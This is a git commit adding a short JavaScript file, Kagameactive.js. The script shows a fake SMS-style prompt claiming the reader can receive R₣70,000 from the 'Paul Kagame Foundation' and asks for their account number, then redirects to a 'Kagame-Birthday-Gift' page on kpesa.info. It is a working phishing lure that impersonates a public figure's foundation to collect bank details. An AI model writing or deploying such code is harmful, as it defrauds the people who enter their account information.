268c9a0779f06ef269b88a1e8e818d6e10b505d5
kpesaa <meiosis_logins.2d@icloud.com>
2026-05-20 07:11:50 +0100

    Create Kagameactive.js

---
+++ Kagameactive.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW R₣70,000'
+password=prompt('SMS: Congratulations, you are eligible to receive R₣70,000 From Paul Kagame Foundation, click OK to Enter Your Acc. Number','WITHDRAW R₣70,000');
+if (password != 'WITHDRAW R₣70,000') {
+location.href='https://kpesa.info/Kagame-Birthday-Gift.html';
+}
